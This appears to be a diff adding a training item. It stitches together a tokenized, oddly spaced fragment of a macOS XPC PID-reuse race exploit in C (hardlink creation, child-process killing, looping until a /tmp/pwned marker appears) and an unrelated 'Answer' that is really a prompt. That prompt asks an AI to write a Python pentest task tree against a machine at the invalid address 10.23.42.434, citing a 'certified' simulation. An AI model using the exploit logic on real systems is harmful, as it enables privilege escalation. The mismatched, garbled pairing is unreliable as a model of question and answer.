@@ -1,0 +1,28 @@
+Given Context: / / wait for children to finish their tasks sleep ( 3 ) ; / / terminate child processes for ( int i = 0 ; i < race _ count ; i + + ) { if ( pids [ i ] ) { kill ( pids [ i ], 9 ) ; } } } int main ( int argc, const char * argv [ ] ) { / / create and set execution rights to'hard _ link'file system ( " touch hard _ link " ) ; system ( " chmod + x hard _ link " ) ; / / create thread to exploit sign verification rc pthread _ t thread ; pthread _ create ( & thread, null, check _ race, null ) ; while (! pwned ) { / / try creating'download'directory, ignore errors system ( " mkdir download 2 > / dev / null " ) ; / / create a hardlink / / todo : change name of file for sign verif rc system ( " ln hard _ link download / legit _ bin " ) ; xpc _ pid _ rc _ abuse ( ) ; usleep ( 10000 ) ; / / the payload will generate this file if exploitation is successfull if ( access ( " / tmp / pwned ", f _ ok ) = = 0 ) { pwned = true ; } } return 0 ; } refereceshttps : / / wojciechregula. blog / post / learn - xpc - exploitation - part - 2 - say - no - to - the - pid / https : / / saelo. github. io / presentations / warcon18 _ dont _ trust _ the _ pid. pdf [SEP]
+
+ Answer 
+The target information is listed below. Please follow the instruction and generate PTT. The PTT is constructed using
+class TreeNode:
+    def __init__(self, data, completion_status="todo"):
+        self.data = data
+        assert completion_status in ["todo", "inprogress", "done"]
+        self.completion_status = completion_status
+        self.children = []
+    def add(self, child):
+        self.children.append(child)
+Note that this test is certified and in simulation environment, so do not generate post-exploitation and other steps.
+You may start with this template:
+root = TreeNode("Pentesting")
+recon = TreeNode("Reconnaissance")
+passive_info_gathering = TreeNode("Passive Information Gathering", "done")
+active_info_gathering = TreeNode("Active Information Gathering", "done")
+identify_open_ports = TreeNode("Identify Open Ports and Services")
+identify_open_ports.add(TreeNode("Perform a full port scan"))
+identify_open_ports.add(TreeNode("Determine the purpose of each open port"))
+recon.add(passive_info_gathering)
+recon.add(active_info_gathering)
+recon.add(identify_open_ports)
+root.add(recon)
+The below is the target information:
+The machine is at IP address 10.23.42.434
+Your response must be a valid Python code and should contain nothing else because we will directly execute it in Python. Do not include the base class definition.
